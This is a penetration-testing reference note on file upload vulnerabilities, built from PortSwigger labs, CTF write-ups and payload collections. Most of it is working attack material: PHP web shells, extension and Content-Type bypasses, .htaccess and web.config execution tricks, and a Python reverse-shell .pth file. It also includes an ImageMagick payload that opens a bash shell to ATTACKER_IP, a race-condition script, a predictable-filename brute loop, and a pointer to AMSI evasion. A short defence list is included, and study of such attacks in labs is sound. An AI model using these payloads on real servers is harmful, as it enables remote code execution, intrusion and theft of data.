---
title: "File Upload Vulnerabilities"
type: technique
tags: [exploitation, file-upload, h1, portswigger, rce, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-07-21
sources: [ps-general-concepts, ps-indepth-file-upload, ps-labs-file-upload, thm-web-file-upload, h1-scraped-file-upload, 0xdf-linux-easy-web, payloadsallthethings-upload-insecure-files, git-payloadsallthethings, git-portswigger-all-labs]
---

# File Upload Vulnerabilities

Quick payloads: [[payloads/file-upload]].

## What it is

File upload vulnerabilities occur when a web server allows users to upload files without sufficiently validating their name, type, contents, or size. An attacker can abuse this to upload server-side scripts (web shells), overwrite configuration files, upload content to unintended paths, or trigger dangerous behaviour in file-processing pipelines.

## How it works

The server receives a multipart form-data POST request containing the file. It then stores the file somewhere on the filesystem and — critically — may execute it if the file extension maps to an executable MIME type. The attack surface depends on two factors: what validation is applied, and what restrictions govern files after upload.

When a web server receives a request for a `.php` file and the server is configured to execute PHP (via `mod_php` or `php-fpm`), it runs the script and returns the output. If an attacker can get a PHP file into a web-accessible directory, they have RCE.

## Prerequisites

- A file upload function in the application
- The server executes scripts of the uploaded type (or can be made to via configuration injection)
- The uploaded file is accessible via HTTP (or can reach a directory that is)
- For Content-Type bypass: the server trusts the client-supplied `Content-Type` header without verifying actual file contents

## Methodology

### 1. Upload an unrestricted web shell

If there are no protections at all, upload a minimal PHP web shell:

```php
<?php echo system($_GET['command']); ?>
```

Then trigger execution:

```http
GET /files/avatars/exploit.php?command=id HTTP/1.1
```

To read a specific file:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### 2. Bypass Content-Type validation

If the server only checks the `Content-Type` header in the multipart request (not the actual file contents), change it in Burp Repeater:

Original upload request part:
```http
Content-Disposition: form-data; name="image"; filename="exploit.php"
Content-Type: application/x-php
```

Modified:
```http
Content-Disposition: form-data; name="image"; filename="exploit.php"
Content-Type: image/jpeg
```

### 3. Extension blacklist bypass

Servers that blacklist `.php` often forget less-common alternatives that Apache/PHP will still execute:

```
# PHP
exploit.php5
exploit.phtml
exploit.shtml
exploit.pHp        (case variation)
exploit.php.       (trailing dot — stripped on Windows)
exploit.p.phphp    (recursive strip: removing .php leaves .php)
exploit%2Ephp      (URL-encoded dot)
exploit.asp;.jpg   (semicolon null-like behaviour in some servers)
exploit.inc
exploit.phar

# ASP
exploit.aspx
exploit.config
exploit.cer
exploit.asa

# JSP
exploit.jspx
exploit.jsw
exploit.jsv
exploit.jspf

# Other useful extensions
.svg   (XXE, XSS, SSRF)
.gif   (XSS)
.csv   (CSV Injection)
.xml   (XXE)
.avi   (LFI, SSRF)
```

### 4. .htaccess override (Apache)

If you can upload files with arbitrary names to a directory, upload a `.htaccess` file that maps a custom extension to PHP's MIME type:

```http
Content-Disposition: form-data; name="image"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
```

Then upload your web shell with a `.l33t` extension — it will execute as PHP.

On IIS, the equivalent is `web.config`.

### 5. Path traversal in the filename

The server may save files based on the `filename` field. If that field is not sanitised, inject directory traversal to write the shell outside the uploads directory (which may not execute scripts):

```http
Content-Disposition: form-data; name="image"; filename="../exploit.php"
```

If the server strips `../`, URL-encode the slash:

```http
filename="..%2fexploit.php"
```

**Double URL-encoding (decode-twice-around-a-single-strip).** When the handler
`urldecode`s the filename, strips `../` **once**, then `urldecode`s **again** before
`move_uploaded_file` (THM Backtrack `dashboard.php`), a single-encoded `../` is caught by
the strip. Send a **double-encoded** `../` = `%252e%252e%252f`: the first decode yields the
inert `%2e%2e%2f` (no literal `../`, the strip does nothing), the second decode restores
`../`, landing the file in the parent (executable) dir. Pair it with a second extension the
allowlist accepts — many apps validate `explode('.', name)[1]` (the *second* segment), so
`%252e%252e%252frev.png.php` passes (`[1]=="png"`) yet executes as `.php`:

```http
Content-Disposition: form-data; name="image"; filename="%252e%252e%252frev.png.php"
```
```bash
# lands at webroot as rev.png.php (only /uploads had `php_flag engine off`)
curl "http://T/rev.png.php?c=id"
```
If unsure how many decodes happen, brute the encodings: `..%2f`, `%2e%2e%2f`, `%252e%252e%252f`,
`..%252f`, `....//`, `..%c0%af` and watch which one escapes.

The file lands one directory up from the upload folder. Access it via:

```http
GET /files/exploit.php
```

### 6. Null byte extension bypass

When a server enforces that filenames end with `.jpg` but passes the filename to C-level file functions that stop at null bytes:

```http
filename="exploit.php%00.jpg"
```

Validation sees `.jpg`; the filesystem writes `exploit.php`.

### 7. Polyglot file (image + PHP)

When the server validates actual image dimensions or magic bytes (e.g., JPEG starts with `FF D8 FF`), create a polyglot file that is a valid JPEG but contains PHP code in metadata:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" cat.jpg -o polyglot.php
```

Upload `polyglot.php`. It passes image validation but executes as PHP because the extension takes precedence.

### 8. Magic bytes bypass (PNG)

To bypass content inspection that checks file headers, add PNG magic bytes to a PHP shell using a hex editor, then upload as `.php`:

PNG magic bytes: `89 50 4E 47 0D 0A 1A 0A`

```bash
hexedit shell.php
# Set first 8 bytes to PNG magic bytes, then write PHP code after
```

### 9. Race condition upload

Some frameworks upload to a temporary directory, validate, then move to the destination. During the brief window before deletion, the file exists and can be executed:

1. Upload the malicious file — it lands in `/tmp/uploads/<random_name>.php`
2. In parallel, immediately request the temporary path to trigger execution before the server removes it
3. To extend the window, upload a very large file with the payload at the beginning

### 10. PUT method upload

Some servers support `PUT` requests for direct file upload without using the upload form:

```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

Probe with `OPTIONS` first to check if `PUT` is advertised.

### 11. Extension fuzzing the denylist

When a denylist is in use, fuzz all PHP-executable extensions to find gaps. Many denylists block `.php` variants but miss `.phar`:

```bash
ffuf -u 'http://target/upload' -X POST \
     -F 'file=@shell.FUZZ;type=image/jpeg' \
     -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt \
     -mr "success|uploaded"
```

Extensions commonly missed by denylists: `.phar`, `.pgif`, `.phtml3`, `.php7`.

### 12. PHAR stream wrapper (upload + LFI combo)

When all `.php` variants are blocked but a separate `?page=` parameter accepts PHP stream wrappers, upload a PHP webshell inside a ZIP archive with an unblocked extension:

```bash
# Package PHP shell inside a ZIP, rename to arbitrary extension
zip shell.0xdf shell.php

# Trigger via phar:// in LFI parameter — unwraps ZIP and executes inner .php
?page=phar:///var/www/uploads/shell.0xdf/shell.php
```

The archive must be a valid ZIP. Any extension not in the denylist works as the outer filename.

### 13. Configuration Files & Dependencies

If standard web shells are blocked, target environment configurations:

**WSGI uwsgi.ini**: uWSGI configuration files parse "magic" variables (`@()`) to execute commands when the service autoreloads:
```ini
[uwsgi]
body = @(exec://whoami)
```

**Node.js / Composer Dependencies**: Overwrite `package.json` or `composer.json` to inject pre/post command scripts:
```json
"scripts": {
    "prepare" : "/bin/touch /tmp/pwned.txt"
}
```

**Python Path File (`.pth`)**: Dropping a `.pth` file into a globally loaded package directory (`/usr/local/lib/python3.x/site-packages/`) provides persistence and code execution every time a Python interpreter starts:
```python
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

### 14. CVEs in File Processing Engines

**ImageMagick (ImageTragik - CVE-2016-3714)**: Upload an image file containing malicious graphic-context properties:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1|touch "hello)'
pop graphic-context
```

**ImageMagick Arbitrary Read (CVE-2022-44268)**: Inject a profile text chunk specifying a local file path (`/etc/passwd`). When the server resizes/converts it, the file contents are embedded in the output image:
```bash
pngcrush -text a "profile" "/etc/passwd" exploit.png
```

**FFmpeg HLS LFI**: FFmpeg processing `.avi` files may parse an embedded HLS playlist. Create a playlist pointing to local files:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST
```

## Key payloads / examples

### Minimal read-file shell

```php
<?php echo file_get_contents('/path/to/target'); ?>
```

### Command execution shell

```php
<?php echo system($_GET['command']); ?>
```

Usage: `GET /uploads/shell.php?command=whoami`

### Polyglot creation (ExifTool — embeds PHP in image metadata)

```bash
exiftool -Comment="<?php echo system(\$_GET['cmd']); ?>" image.jpg -o shell.php
```

### GIF magic bytes polyglot (inline — no external tool required)

Prepend the ASCII GIF89a magic string directly in the file body before the PHP payload. Many content-validation routines accept this as a valid GIF:

```
GIF89a
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Upload with a `.php` extension. The server reads `GIF89a` and considers it a GIF; PHP ignores the leading garbage and executes from the `<?php` tag onward.

### .htaccess payload

```
AddType application/x-httpd-php .l33t
```

### Null byte bypass

```
filename="shell.php%00.png"
```

## Bypasses and variants

| Bypass | Technique |
|--------|-----------|
| Content-Type check | Set `Content-Type: image/jpeg` while keeping `.php` extension |
| Extension blacklist | Use `.php5`, `.phtml`, `.pHp`, trailing dot |
| Extension whitelist | Upload `.htaccess` first to map new extension |
| Path restriction | Directory traversal in filename (`..%2f`) |
| Extension enforcement | Null byte: `shell.php%00.jpg` |
| Image content check | Polyglot (ExifTool) or magic byte prepend |
| Sandbox/temp validation | Race condition |
| Regex without `$` anchor | Double extension (`shell.php.jpg`) when FilesMatch regex lacks trailing `$`; `.php` matched as substring |
| Extension denylist gap | Fuzz with ffuf — `.phar`, `.php7` often missed; both execute as PHP in default configs |
| PHAR + LFI combo | Upload as arbitrary extension (`.0xdf`); trigger via `phar://path/shell.ext/shell.php` in LFI param |
| `include()` serving files | Whitelist-bypassed `.jpg` executes as PHP if the image endpoint uses `include()` not `readfile()` |
| CMS plugin ZIP install | Plugin systems (Pluck, LimeSurvey) extract uploaded ZIPs to web root without content inspection |
| dompdf font cache | CSS `@font-face src:` (CVE-2022-28368) — fetched font cached as `[name]_normal_[md5(url)].php` |
| Trailing dot OS normalization | `shell.php.` — denylist misses `.php.`; OS strips trailing dot, saving `shell.php` on disk |

## Real-World Examples (HackerOne — paid reports)

| Program | Title | Severity | Bounty | Report |
|---------|-------|----------|--------|--------|
| Reddit | Unrestricted File Upload on reddit.secure.force.com | Low | $100 | [#1606957](https://hackerone.com/reports/1606957) |

**Patterns:** Unrestricted extension/MIME validation on Salesforce-hosted endpoints. Low bounty reflects limited impact (no RCE achieved), but demonstrates that even large programs miss upload controls on third-party integrations.

## From the Wild

### HTB — Magic (2020)
- **Technique variant**: Double extension exploiting missing `$` anchor in Apache FilesMatch
- **Attack path**: Upload requires `.jpg`/`.png` extension AND valid JPEG magic bytes; Apache config uses `FilesMatch ".+\.ph(p([3457s]|\-s)?|t|tml)"` without trailing `$`; upload `shell.php.jpg` with valid magic bytes — Apache matches `.php` as substring and executes the file as PHP

### HTB — UpDown (2022)
- **Technique variant**: PHAR stream wrapper via arbitrary-extension upload
- **Attack path**: Denylist blocks `.php`, `.phtml`, `.zip`, `.rar` etc. but not custom extensions; pack PHP shell inside a ZIP renamed to `.0xdf`; trigger via LFI: `?page=phar:///var/www/dev/uploads/shell.0xdf/shell.php`; `phar://` unwraps the ZIP and executes the inner PHP; use `proc_open` because `system`/`exec` are in `disable_functions`

### HTB — Hospital (2023)
- **Technique variant**: Extension fuzzing reveals `.phar` bypasses the denylist
- **Attack path**: Denylist blocks `.php` and common variants; fuzz with ffuf using `-mr "Location: /success.php"` to detect which extensions are accepted; `.phar` executes as PHP and is not in the denylist; use `popen()` instead of `system()` to bypass `disable_functions`

### HTB — Timing (2021)
- **Technique variant**: Whitelist-bypassed `.jpg` executes as PHP when served via `include()`
- **Attack path**: Only `.jpg` accepted; upload PHP code saved as `shell.jpg`; `image.php?img=<path>` uses PHP `include()` to serve images, causing the `.jpg` to execute as PHP; filename is `md5('$file_hash' . time())` where unset `$file_hash` is a literal string, making the timestamp the only unknown for brute-forcing the path

### HTB — Interface (2023)
- **Technique variant**: dompdf CSS `@font-face` cache write (CVE-2022-28368)
- **Attack path**: HTML-to-PDF export via dompdf 1.2.0; inject `@font-face { src: url('http://ATTACKER/font.php'); }` into submitted HTML; dompdf fetches and caches the font at `vendor/dompdf/lib/fonts/[family]_normal_[md5(url)].php`; embed PHP webshell in the binary font file before serving it; access via the deterministic cache path

### HTB — Environment (2025)
- **Technique variant**: Trailing dot extension bypass via OS filename normalization (CVE-2024-21546)
- **Attack path**: Laravel Filemanager denylist rejects `.php`; upload `shell.php.` with a trailing dot; denylist sees extension `.php.` and does not match; OS normalizes by stripping the trailing dot, saving the file as `shell.php` on disk

### HTB — Usage (2024)
- **Technique variant**: Client-side validation only (CVE-2023-24249)
- **Attack path**: Laravel-Admin profile picture upload validates filename only in the browser; upload `shell.php.jpg` to pass client-side check, intercept in Burp Suite, rename to `shell.php` before forwarding; server stores whatever filename arrives in the multipart `Content-Disposition` header

### HTB — Passage (2020)
- **Technique variant**: EXIF polyglot + Burp intercept filename rename
- **Attack path**: CuteNews avatar upload validates extension client-side only; embed PHP webshell via `exiftool -Comment='<?php system($_GET["cmd"]); ?>'` into a valid PNG; intercept upload in Burp and rename from `avatar.png` to `avatar.php`; server saves the binary PNG file as `.php` and executes it

## Detection and defence

- **Use an extension whitelist** rather than a blacklist (only allow `.jpg`, `.png`, `.gif`, etc.)
- **Rename uploaded files** server-side to remove attacker-controlled extension information
- **Validate actual file contents** (magic bytes, image dimensions) and not just the MIME type header
- **Store uploads outside the web root** or in a separate domain; never execute files from user-upload directories
- **Disable script execution** in upload directories via server configuration
- **Use a CDN or object storage** (S3, Azure Blob) to serve uploaded files — these do not execute code
- **Validate filenames** and strip directory traversal sequences before saving

## Tools

- [[burp-suite]] — Repeater and Intruder for modifying upload requests and fuzzing extensions
- `exiftool` — create polyglot files by injecting PHP into image metadata
- `hexedit` — manually prepend magic bytes to a file
- SecLists — extension wordlists for fuzzing blacklists

## Payload reference (PayloadsAllTheThings)

Additional extension bypass variants and server-specific file execution tricks from PAT not covered in the Methodology section above.

### Extension manipulation — less-common bypasses

```
# PHP variants that some denylists miss
exploit.php%00.gif    # null byte (legacy PHP)
exploit.php5
exploit.phtml
exploit.phar
exploit.shtml
exploit.pgif

# IIS / ASP variants
exploit.cer
exploit.asa
exploit.config

# Case and space tricks (Windows)
exploit.php.         # trailing dot stripped by OS
exploit.PHP          # case variation if server is case-sensitive check only
```

### Magic bytes for content-based validation bypass

```
# PNG magic bytes: 89 50 4E 47 0D 0A 1A 0A
# JPEG magic bytes: FF D8 FF
# GIF magic bytes: 47 49 46 38 37 61 (GIF87a) or 47 49 46 38 39 61 (GIF89a)

# Use xxd to prepend PNG header to PHP file
printf '\x89PNG\r\n\x1a\n' | cat - shell.php > shell_with_magic.php
```

### Filename-based injection payloads

```
# SQLi in filename (if stored in DB without sanitisation)
sleep(10)-- -.jpg
'sleep(10)-- -.jpg

# Path traversal in filename
../../../var/www/html/shell.php
..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php

# XSS in filename (rendered in upload listing)
"><svg onload=alert(1)>.jpg
```

### IIS web.config as code execution vector

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write"
              preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<% Response.Write(CreateObject("WScript.Shell").Exec("cmd.exe /c whoami").StdOut.ReadAll()) %>
```

## PortSwigger Labs

### Lab 1 — Remote code execution via web shell upload (Apprentice)

No upload protection at all. Upload a minimal PHP shell directly.

1. Log in as `wiener:peter`, navigate to profile → avatar upload.
2. Capture the `POST /my-account/avatar` request in Burp Proxy → send to Repeater.
3. Change `filename="avatar.png"` to `filename="exploit.php"`, replace image bytes with:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

4. Send — server confirms upload to `/files/avatars/`.
5. Send `GET /files/avatars/exploit.php` → response contains the secret.

---

### Lab 2 — Web shell upload via Content-Type restriction bypass (Apprentice)

Server validates `Content-Type` header only — not actual file contents.

1. Upload a real image; capture both the `POST` upload request and the `GET` serving request in Repeater.
2. In the `POST` request: change `filename` to `exploit.php`, replace image bytes with the PHP payload, but keep `Content-Type: image/jpeg` in the multipart part header.
3. Send — upload succeeds because the server trusts the client-supplied MIME header.
4. Switch to the `GET` repeater tab, change path to `/files/avatars/exploit.php` → secret in response.

Key: the server checks the `Content-Type` field in the `Content-Disposition` part, not the file magic bytes.

---

### Lab 3 — Web shell upload via path traversal (Practitioner)

Upload directory does not execute PHP; parent directory does. Server sanitises plain `../` but not URL-encoded form.

1. Upload a legitimate image; capture `POST` and `GET` in Repeater.
2. In the `POST`, change filename to `..%2fexploit.php` (URL-encoded `/`).

```http
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: application/octet-stream

<?php echo system($_GET['command']); ?>
```

3. Send — server decodes `%2f` after the blacklist check, writes the file one level up.
4. Access via `GET /files/exploit.php` (not `/files/avatars/exploit.php`).

---

### Lab 4 — Web shell upload via extension blacklist bypass (Practitioner)

`.php` and `.php.jpg` double-extension are both blocked. `.phtml` is not in the blacklist.

Alternative PHP-executable extensions to try when `.php` is denied:

```
.php5   .php7   .php4   .pht   .phtml   .phar   .shtml
```

1. Upload `phpinfo.php` → blocked.
2. Try `phpinfo.jpg.php` → also blocked (server checks full filename).
3. Rename to `exploit.phtml` with payload `<?php echo file_get_contents('/home/carlos/secret'); ?>`.
4. Upload succeeds. Access `/files/avatars/exploit.phtml` → executes as PHP.

---

### Lab 5 — Web shell upload via obfuscated file extension (Practitioner)

Server enforces `.jpg`/`.png` extension but passes filename to C-level functions that stop at null bytes.

| Filename | Validation sees | Filesystem writes | Outcome |
|---|---|---|---|
| `exploit.php` | ends with `.php` | `exploit.php` | Blocked |
| `exploit.php.jpg` | ends with `.jpg` | `exploit.php.jpg` | Blocked |
| `exploit.php%00.jpg` | ends with `.jpg` | `exploit.php` | **Allowed + executable** |

Steps:
1. Upload real image; send both requests to Repeater.
2. In `POST`, change filename to `exploit.php%00.jpg`, replace body with PHP payload.
3. Send → upload succeeds.
4. `GET /files/avatars/exploit.php` (filesystem stripped null byte and everything after it) → secret in response.

---

### Lab 6 — Remote code execution via polyglot web shell upload (Practitioner)

Server validates magic bytes. Two bypass approaches:

**Option A — GIF magic bytes inline:**

```
GIF89a
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Set `filename="exploit.php"` and `Content-Type: image/gif`. Server reads `GIF89a` header and accepts; PHP executes from `<?php` onward.

**Option B — ExifTool JPEG polyglot:**

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.png -o polyglot.php
```

Upload `polyglot.php`. Valid JPEG/PNG structure passes content inspection; PHP executes the Comment field as code.

Access `/files/avatars/exploit.php` (or `polyglot.php`) → secret in response.

---

### Lab 7 — Web shell upload via race condition (Expert)

Server moves the file to the web-accessible upload directory first, then runs virus/filetype checks, then deletes invalid files. There is a brief window between move and delete during which the file can be executed.

Vulnerable server-side pattern:

```php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);  // file is live here
if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "File uploaded.";
} else {
    unlink($target_file);   // deleted here — but window exists between lines
    http_response_code(403);
}
```

Exploit steps:
1. Create `shell.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Capture the `POST /my-account/avatar` upload in Burp; send to Intruder.
3. Capture the `GET /files/avatars/shell.php` request; send to a second Intruder tab.
4. Intruder settings for **both** tabs:
   - Attack type: `Sniper`
   - Payload type: `Null payloads` → Continue indefinitely
   - Uncheck URL-encode payload characters
5. Start both attacks simultaneously. During the window between `move_uploaded_file` and `unlink`, the GET request returns the secret.

Alternative using `turbo-intruder` extension for tighter timing control:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)
    for i in range(100):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```

---

## Safe pre-upload confirmation of script execution in a directory

Request a nonexistent `.php` file in the target directory and a nonexistent `.txt` in the SAME directory. If PHP execution is enabled there, PHP-FPM/mod_php emits its own short "File not found." body (fixed small size) for the `.php` request, proving the request was routed to the interpreter, while the `.txt` request gets the web server's own larger static 404 page.
```
GET /uploads/zz.php   -> 404, 16 b,  "File not found."   <- interpreter answered
GET /uploads/zz.txt   -> 404, 196 b, Apache error page   <- static handling, control
```
This proves the last line of defense (execution disabled in writable directories) is missing, entirely from safe non-existent-file probes, before ever testing whether an actual upload bypass exists.

## Filename-XSS survives even when uploads are fully disabled

When a chat/ticket/support widget disables real file uploads, also probe the message-creation endpoint for a file-metadata-shaped JSON field. Many apps let the message layer attach a "file" purely by reference (`{"url":..., "filename":..., "mimetype":...}`) with no check that the referenced upload ever happened, so a crafted `filename` containing a quote/HTML still lands verbatim in storage and renders unescaped wherever a staff/reviewer console displays the attachment name, even though the upload feature itself is switched off.

Seen twice independently (a chat widget's message API, and a grant-application review page's file-attach endpoint), both landing stored XSS in a staff console purely via the FILENAME, never the file content. Always test the filename/display-name field of any upload or attachment-reference feature as its own injection point, separate from content-based upload filters.

## Sources

- PortSwigger Academy — Upload Vulns (General Concepts) and File Upload Vulnerabilities (In-depth)
- PortSwigger Labs 1–7: Unrestricted shell, Content-Type bypass, Path traversal filename, .htaccess override, Null byte, Polyglot, Race condition
- THM CTF: Expose (upload with magic bytes + null byte bypass)

## Upload to an app that EXECUTES the file (analyser / validator / sandbox) = RCE

Distinct from the "trick the server into executing a `.php`/`.jsp` by extension or config" case: some
apps EXECUTE the uploaded file as their intended function - a "script analyser", "malware/AV scanner",
"linter", "sandbox", "format converter", "template/report renderer". There the accepted file type IS an
executable script, so no extension/content-type bypass is needed: upload your payload AS the allowed
type and it runs.

Signals: the UI says "analyse / scan / validate / preview / convert this <script/macro/template>",
accepts `.ps1`/`.py`/`.sh`/`.rb`/`.js`/`.svg`/office-macro/`.tex`, and returns an
"analysing.../output:" style response.

Method:
1. **OOB-gate first** (the run is usually blind): upload a file whose only action is an out-of-band
   callback (`Invoke-WebRequest http://<LHOST>/x`, a `curl`, or a DNS lookup). A hit on your listener
   confirms execution before you claim RCE; never infer it from the response text.
2. Then upload the real payload (a reverse shell in that language). If the host runs EDR/AMSI (common
   for a PowerShell/macro analyser), the payload needs in-line evasion (e.g. an AMSI patch for executed
   PowerShell), because the file is run through the normal interpreter.

The extension allowlist is irrelevant here - the allowed type is the exploit. See [[os-command-injection]]
for the RCE sink and [[windows-amsi-bypass]] when the executed language is PowerShell under Defender.

<!-- promoted-slug: upload-executed-by-analyser-rce -->

## Related

- [[xxe]] (uploaded SVG, DOCX, or XML is parsed with external entities enabled)
- [[ssti]] (an uploaded file rendered server-side as a template yields RCE)
- [[xss]] (a stored SVG or HTML upload served inline executes as XSS)

<!-- promoted-slug: confirm-server-side-script-execution-is-enabled-in-an-upload -->

<!-- promoted-slug: a-file-upload-disabled-control-can-be-dead-on-arrival-if-a-s -->

## Predict a weak "random" stored filename

An upload that accepts your file but **renames it with a weak "random" function** is still
reachable: if the name is derived from a low-entropy, attacker-observable seed, you can predict it
and request the stored file directly (turning an "unlinkable" upload into web-shell RCE).

**Tell:** the stored name is a fixed-length hex string (32 hex = `md5(...)`, 40 = `sha1`), and an
existing sample (e.g. a leaked attachment) shows that format. Common weak schemes and how to invert:

| Scheme | Predict it by |
|---|---|
| `md5(time())` / `md5(date(...))` | the server's `Date` response header at upload = the seed; brute a +/-few-second window |
| `md5(uniqid())` (no more_entropy) | `uniqid()` = `sprintf('%08x%05x', sec, usec)` of upload time; brute the microsecond range |
| `md5(rand())` / `md5(mt_rand())` | seedable/small space; recover the PRNG seed if another output leaks (see [[cryptography-attacks]] PRNG) |
| stored name kept the original extension | so `<hash>.php` executes -> request it with `?cmd=` |

`md5(time())` example (the highest-frequency case):
```bash
# upload the shell, capturing the server Date header
D=$(curl -s -D - -b cookies.txt "$URL" -F "file=@shell.php" -F "submit=x" -o /dev/null | sed -n 's/^[Dd]ate: //p' | tr -d '\r')
T=$(date -d "$D" +%s)
# the stored name is md5(<unix second>) . <ext>; brute a small window
for off in $(seq -5 5); do
  h=$(printf %s $((T+off)) | md5sum | cut -d' ' -f1)
  curl -s "$BASE/uploads/$h.php?cmd=id" | grep -q uid= && echo "shell -> /uploads/$h.php"
done
```
Confirm by execution (per the confirmation gate), not by a 200 on the upload. If PHP is filtered by
extension, this pairs with any allowed-but-executable extension or an [[path-traversal-lfi]] include.

<!-- promoted-slug: upload-predictable-random-filename -->
